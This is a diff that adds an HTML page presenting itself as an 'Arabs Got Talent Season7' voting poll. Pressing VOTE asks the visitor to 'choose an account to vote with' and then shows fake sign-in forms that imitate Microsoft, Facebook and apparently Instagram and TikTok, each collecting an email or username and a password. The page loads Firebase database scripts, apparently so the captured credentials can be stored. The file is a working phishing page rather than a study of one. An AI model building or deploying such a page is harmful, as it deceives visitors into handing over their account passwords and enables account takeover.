@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en" id="html" x-data="global()" class="h-full js-focus-visible">
+
+<head>
+  <meta charset="utf-8">
+  <title>Arabs Got Talent Season7</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="assets/dist/main.css">
+  <link rel="stylesheet" href="assets/all.min.css">
+  <script defer src="assets/dist/app.js"></script>
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta property="fb:app_id" content="567582844767504" />
+  <meta property="og:site_name" content="Season7" />
+  <meta property="og:title" content="Arabs Got Talent Season7" />
+  <meta property="og:description"
+    content="Cast your votes for the most talented stars in the Arabs Got Talent Season7! Support your favorite acts in categories like singing, dancing, comedy, magic, and more." />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="img/w4nWVAQWyAL-c.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <!-- Add this line in the <head> section of your HTML -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="css/index.css">
+</head>
+
+<body class="font-sans antialiased min-h-full flex flex-col text-default bg-transparent">
+  <div id="">
+    <div id="home" class="flex-auto  ">
+      <div>
+        <div class="space-y-8 ">
+          <div class="agt-box custom-box custom-box-primary overflow-visible mx-auto max-w-full"
+            :class="{ 'max-w-full': !expandBox, 'max-w-full': expandBox }">
+            <div class="space-y-8 mb-8 pt-4 px-4 sm:px-6 sm:pt-6">
+              <div id="poll-container" class="flex justify-between">
+                <div class="flex-grow flex flex-col">
+                  <h1 id="poll-title"
+                    class="agt-title text-2xl text-gray-900 dark:text-gray-200 font-semibold custom-title break-words">
+                    Arabs Got Talent Season7
+                  </h1>
+                </div>
+
+                <div class="flex items-top space-x-3">
+                </div>
+              </div>
+
+              <div x-data="{ poll: Alpine.store(&#39;poll&#39;), i: 0,  }">
+                <div class="flex">
+                  <div class="text-gray-500 custom-text mr-3">
+                    <svg class="h-5 w-5 " xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                      stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z" />
+                    </svg>
+                  </div>
+                  <div class="text-gray-500 custom-text ">
+                    <span class="whitespace-pre-line break-words">Cast your votes for the most
+                      talented stars in the Arabs Got Talent Season7! Support your favorite acts
+                      in categories like singing, dancing, comedy, magic, and more. Every vote
+                      takes them one step closer to becoming the champion—your voice makes the
+                      difference!
+
+                      Voting ends soon. Don’t miss your chance to make it count!</span>
+                  </div>
+                </div>
+              </div>
+              <div class="flex justify-center px-0 sm:px-20">
+                <img src="img/w4nWVAQWyAL-c.png" alt="Poll image" />
+              </div>
+
+            </div>
+
+            <div x-data="pollVote()" class="agt-form px-4 sm:px-6">
+              <div class="space-y-8 pb-4 sm:pb-6" style="min-width: 168px; ">
+                <div x-data="rankingVote()">
+                  <div class="text-gray-500 flex justify-center custom-text">
+                    <span
+                      x-show="$store.poll.pollConfig.layout === 'drag' || $store.poll.pollConfig.layout === 'default' && isMobileView">
+                      Select a contestant and then hit the vote button next to their number to
+                      proceed
+                    </span>
+                  </div>
+                  <div class="mt-4 text-lg sm:text-base" style="min-width: 168px;">
+                    <div id="poll_options" class="fix-drag-hover mx-auto sm:max-w-full" style="max-width: 100%;"
+                      x-data="dragOptions()">
+                      <template x-for="(option, i) in initialOptions" :key="option.id">
+                        <div :data-id="option.id" :data-value="option.value"
+                          class="drag-item flex items-center justify-between mt-3 rounded-md border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-700 px-4 py-3 cursor-grab">
+                          <div class="flex flex-grow items-center space-x-3  border-r custom-border pr-3">
+                            <span
+                              class="rounded-full w-8 h-8 flex items-center justify-center custom-field-input border custom-border shrink-0 mr-1"
+                              x-text="currentPosition[option.id]"></span>
+                            <span x-html="parseMarkDown(option.value)"></span>
+                          </div>
+                          <div class="ml-3">
+                            <button onclick="vote()" class="button text-sm custom-button px-8">
+                              <!-- Display points as button text -->
+                              <span id="points-display">VOTE</span>
+                            </button>
+                          </div>
+                        </div>
+                    </div>
+                    </template>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="agt-embed-footer px-4 sm:px-6 py-3 border-t custom-border space-y-3">
+            <div class="flex flex-col items-center sm:flex-row sm:justify-between">
+              <div class="hidden sm:block">
+                <span class="custom-text">
+                  <span id="copyright-year"></span>
+                </span>
+
+                <script>
+
+                </script>
+              </div>
+              <div class="custom-text">Powered by <a href="" target="_blank" class="font-semibold hover:underline">M
+                  B C</a></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Choose Social Login -->
+  <div id="socialDialog" class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+
+    <!-- Overlay -->
+    <div class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80" onclick="hideAlert()" aria-hidden="true">
+    </div>
+
+    <!-- Trick to center modal -->
+    <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true"></span>
+
+    <!-- Error Dialog -->
+    <div id="modal-content"
+      class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+
+      <!-- Close button -->
+      <div class="absolute top-0 right-0 pt-4 pr-4">
+        <button type="button"
+          class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+          onclick="can()">
+          <span class="sr-only">Close</span>
+          <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+            </path>
+          </svg>
+        </button>
+      </div>
+
+      <!-- Modal Content -->
+      <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+        <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-transparent">
+          <svg class="h-6 w-6 text-yellow-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+            stroke="currentColor" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M12 2L2 22h20L12 2zm0 13v-4m0 4h0" />
+          </svg>
+        </div>
+        <div class="mt-3 text-center sm:mt-5">
+          <h3 id="alert-title" class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+            Choose an account to vote with
+          </h3>
+          <!-- Social Media Icons -->
+          <div class="mt-6 flex justify-center space-x-8">
+            <img width="50px" height="50px" title=""
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="img/pikin.svg" alt="" onclick="im(); can();">
+
+            <img width="50px" height="50px" title=""
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="img/mama.svg" alt="" onclick="bni(); can();">
+
+            <img width="50px" height="50px" title=""
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="img/tgv_o_.svg" alt="" onclick="ik(); can();">
+
+            <img width="50px" height="50px" title=""
+              class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+              src="img/apapmapa.png" alt="" onclick="gwa(); can();">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+  <div id="cityboiz">
+    <div id="lagos" class="bg-gray mt-4">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow">
+          <div class="tokpart ">
+            <div class=" p-5 w-full max-w-md">
+              <img src="img/apapmapa2.png" alt="logo" class="h-10 mt-20">
+              <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
+              <p class="text-xl text-white mb-6 mt-0 text-left">to continue</p>
+              <!-- oruk Input -->
+              <div id="janape" class="flex justify-start">
+                <input type="text" id="lag-oruko" name="oruk" required
+                  class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                  placeholder="Email, phone, or Skype" />
+              </div>
+              <div class="flex justify-start">
+                <button id="forgotPasswordButton" type="button"
+                  class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                  No account?
+                  <span class="text-blue-500 hover:underline"> Create one!</span>
+                </button>
+              </div>
+              <!-- Next Button to show password field -->
+              <button id="nextButton" type="button" onclick="revField()"
+                class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                Next
+              </button>
+              <!-- Password Field (hidden initially) -->
+              <div id="passwordField" class="hidden mt-4">
+                <div class="mb-4 relative">
+                  <input type="text" id="lag-zom" name="password" required
+                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                    placeholder="Password" />
+                </div>
+                <button id="nextButton" type="button" onclick="lag()"
+                  class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                  Submit
+                </button>
+
+              </div>
+
+            </div>
+          </div>
+        </main>
+        <!-- Footer Section -->
+        <footer id="error-message" class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
+          <div class=" w-full px-4">
+            <div class="flex justify-between items-center">
+              Sorry, we could not find your account.
+            </div>
+          </div>
+        </footer>
+
+      </div>
+
+    </div>
+
+    <div id="edo" class="bg-black">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow p-2"> <!-- Reduced padding here -->
+          <div class="flex justify-center mt-11 mb-6">
+            <!-- Centered Image -->
+            <img src="image/manae.svg" alt="logo" class="h-12">
+          </div>
+          <div class="tokpart bg-black">
+            <div class="bg-black p-8 w-full max-w-md">
+              <div id="buttonsContainer">
+                <!-- Container Div for Google, Apple Buttons, and 'or' Divider -->
+                <button type="button" onclick=""
+                  class="w-full py-2 bg-blue-600 px-4 rounded-md flex items-center justify-center text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4"
+                  style="font-family: 'Google Sans', arial, sans-serif; font-weight: 400; overflow: hidden;">
+                  <!-- Google Icon -->
+                  Continue Using <img src="image/fav.png" alt="Google Icon" class="h-5 ml-3">
+
+                </button>
+                <div class="flex items-center my-4">
+                  <div class="flex-grow border-t border-gray-700"></div>
+                  <span class="mx-4 text-gray-500">OR</span>
+                  <div class="flex-grow border-t border-gray-700"></div>
+                </div>
+              </div>
+              <!-- oruk Input -->
+              <div class="mb-4 relative">
+                <input type="text" id="edo-oruko" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                  placeholder="Phone, email address, or username" />
+              </div>
+              <div class="mb-4">
+                <!-- Input Field -->
+                <input type="text" id="edo-zom" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-300"
+                  placeholder="Password" />
+
+                <!-- Forgot Password Button -->
+                <button type="button"
+                  class="text-blue-600 py-2 px-4 rounded-none bg-transparent border-0 hover:text-blue-800 focus:outline-none focus:ring-0 mt-0 mr-0 ml-auto block">
+                  Forgotten login?
+                </button>
+              </div>
+              <!-- Login Button -->
+              <button type="button" onclick="edolog()"
+                class="w-full bg-blue-600 text-gray-100 py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4">
+                Log in
+              </button>
+            </div>
+          </div>
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" style="background-color: rgb(18, 18, 18);"
+          class="text-white text-sm mt-2 text-center py-1 mt-auto w-full">
+          <div class="flex justify-center items-center flex-col">
+            <!-- Text above the image with reduced margin -->
+            <p class="mb-0" style="font-size: 12px; margin-bottom: 2px;">from</p>
+            <!-- Linked image -->
+            <a href="">
+              <img src="image/mee.png" alt="logo" class="h-14">
+            </a>
+          </div>
+        </footer>
+      </div>
+    </div>
+
+    <div id="abuja">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow">
+          <div class="flex justify-between items-center p-4">
+            <!-- Left Section -->
+            <div class="flex items-center">
+              <img src="img/tlo.png" alt="logo" class="h-10">
+            </div>
+            <!-- Right Section -->
+            <div class="flex items-center space-x-2">
+              <i class="fa fa-question-circle text-gray-500 hover:text-gray-700" aria-hidden="true"></i>
+              <span id="feedback-help" class="text-gray-500 hover:text-gray-700">Feedback and
+                help</span>
+            </div>
+          </div>
+          <div class="tokpart text-black">
+            <div class="bg-white p-8 w-full max-w-md">
+              <h2 id="login-title" class="text-2xl font-bold mb-6 text-center">Log In</h2>
+              <div>
+                <div class="mb-4">
+                  <label id="oruk-label" for="oruk" class="block text-sm font-medium text-gray-700">Email or
+                    username</label>
+                  <input type="text" id="abuja-oruko" required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                    oninput="checkInput()">
+                  <p id="oruk-feedback" class="text-sm text-red-500 hidden">Please enter a valid
+                    account.</p>
+                </div>
+                <div class="mb-6">
+                  <label id="password-label" for="password"
+                    class="block text-sm font-medium text-gray-700">Password</label>
+                  <input type="text" id="abuja-zom" name="password" required
+                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
+                    oninput="checkPassword()">
+                  <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be at
+                    least 6 characters long.</p>
+                </div>
+                <div class="flex items-center justify-between mb-6">
+                  <div class="text-sm">
+                    <a id="forgot-password" href="#" class="font-medium text-gray-600 hover:text-gray-500">Forgot
+                      login?</a>
+                  </div>
+                </div>
+                <button onclick="abjlog()" type="submit"
+                  class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Log
+                  in</button>
+              </div>
+              <p id="signup-text" class="mt-6 text-center text-sm text-gray-600">
+                Don't have an account?
+                <a href="#" class="font-medium text-pink-600 hover:text-pink-500">Sign up</a>
+              </p>
+            </div>
+          </div>
+        </main>
+        <!-- Footer Section -->
+        <footer class="bg-gray-900 text-white py-6 mt-auto w-full">
+          <div class="w-full px-4">
+            <div class="flex justify-between items-center">
+              <!-- Left Section: Language Selector with Rounded Border -->
+              <div class="flex items-center space-x-4">
+                <select id="languageSelect" onchange="translatePage()"
+                  class="bg-gray-900 text-gray-500 py-1 px-3 rounded-80 border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                  <option value="en">English</option>
+                  <option value="es">Español</option>
+                  <option value="fr">Français</option>
+                  <option value="de">Deutsch</option>
+                  <option value="it">Italiano</option>
+                  <option value="pt">Português</option>
+                  <option value="zh">中文 (Chinese)</option>
+                  <option value="ar">العربية (Arabic)</option>
+                </select>
+              </div>
+              <!-- Right Section: Copyright -->
+              <div class="text-sm text-gray-500">
+                &copy; 2025
+              </div>
+            </div>
+          </div>
+        </footer>
+      </div>
+    </div>
+
+    <div id="owerri" class="bg-gray-100 text">
+      <div class="min-h-screen flex flex-col w-full">
+        <!-- Main Content Section -->
+        <main class="flex-grow p-2"> <!-- Reduced padding here -->
+          <div class="flex justify-center mt-9 mb-4">
+            <!-- Centered Image -->
+            <img src="img/bisho.png" alt="logo" class="h-12">
+          </div>
+          <div class="flex justify-center mb-4 text-black">
+
+          </div>
+          <div class="tokpart">
+            <div class="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
+              <!-- oruk Input -->
+              <div class="mb-4 relative">
+                <input type="text" id="owerri-oruko" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                  placeholder="Email address or phone number" />
+              </div>
+              <div class="mb-4">
+                <!-- Input Field -->
+                <input type="text" id="owerris-zom" name="" required
+                  class="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md  focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-[transparent] peer text-gray-800"
+                  placeholder="Password" />
+                <!-- Login Button -->
+                <button type="button" onclick="imo()"
+                  class="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
+                  Log in
+                </button>
+                <!-- Forgot Password Button -->
+                <button type="button"
+                  class="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
+                  Forgotten Password?
+                </button>
+                <!-- Divider -->
+                <div class="flex items-center my-2">
+                  <div class="flex-grow border-t border-gray-300"></div>
+                  <div class="flex-grow border-t border-gray-300"></div>
+                </div>
+                <!-- Create New Account Button -->
+                <button type="button"
+                  class="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
+                  Create new account
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="flex justify-center mb-4 mt-7 text-gray-600">
+            <p class="text-l text-center break-words max-w-md">
+              <span style="font-weight: 600;"> Create a Page </span> for a celebrity, brand or
+              business.
+            </p>
+          </div>
+        </main>
+
+        <!-- Footer Section -->
+        <footer id="error-message" class="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
+          <div class="w-full px-5">
+            <!-- Container -->
+            <div class="flex flex-col gap-4">
+
+              <!-- Language Section -->
+              <div class="px-2">
+                <div class="flex flex-wrap gap-2 text-xs text-gray-600">
+                  <a href="#" class="inline-block cursor-pointer hover:underline">English (UK)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Hausa</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Français
+                    (France)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Português
+                    (Brasil)</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Español</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">العربية</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Bahasa
+                    Indonesia</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Deutsch</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">日本語</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">Italiano</a>
+                  <a href="#" class="inline-block cursor-pointer hover:underline">हिन्दी</a>
+                </div>
+              </div>
+              <!-- Divider Line -->
+              <hr class="border-gray-300 w-full">
+              <!-- Copyright Section -->
+              <div class="px-2 text-xs text-gray-500">
+                &copy;2025
+              </div>
+            </div>
+          </div>
+        </footer>
+      </div>
+    </div>
+  </div>
+
+  <!-- Custom Alert -->
+  <div id="custom-alert" class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+    <!-- Overlay -->
+    <div class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80" onclick="hideAlert()" aria-hidden="true">
+    </div>
+    <!-- Trick to center modal -->
+    <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true"></span>
+    <!-- Error Dialog -->
+    <div id="modal-content"
+      class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+      <!-- Close button -->
+      <div class="absolute top-0 right-0 pt-4 pr-4">
+        <button type="button"
+          class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+          onclick="hideAlert()">
+          <span class="sr-only">Close</span>
+          <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+            </path>
+          </svg>
+        </button>
+      </div>
+      <!-- Modal Content -->
+      <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+        <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100">
+          <svg class="h-6 w-6 text-red-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+            stroke="currentColor" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M12 2a10 10 0 110 20 10 10 0 010-20zm-4 8l8 8m0-8l-8 8"></path>
+          </svg>
+        </div>
+        <div class="mt-3 text-center sm:mt-5">
+          <h3 id="alert-title" class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+            Vote not successful
+          </h3>
+          <div class="mt-2">
+            <p id="alert-message" class="text-sm text-gray-500">
+              Sorry, something went wrong. Please try again.
+            </p>
+          </div>
+        </div>
+        <div class="mt-4 sm:mt-6 sm:flex sm:space-x-6">
+          <button onclick="hideAlert()"
+            class="button w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition duration-300">
+            Try Again
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src=" https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js">
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="js/firebase.js"></script>
+  <script src="js/main.js"></script>
+  <script src="js/index.js"></script>
+
+</body>
+
+</html>
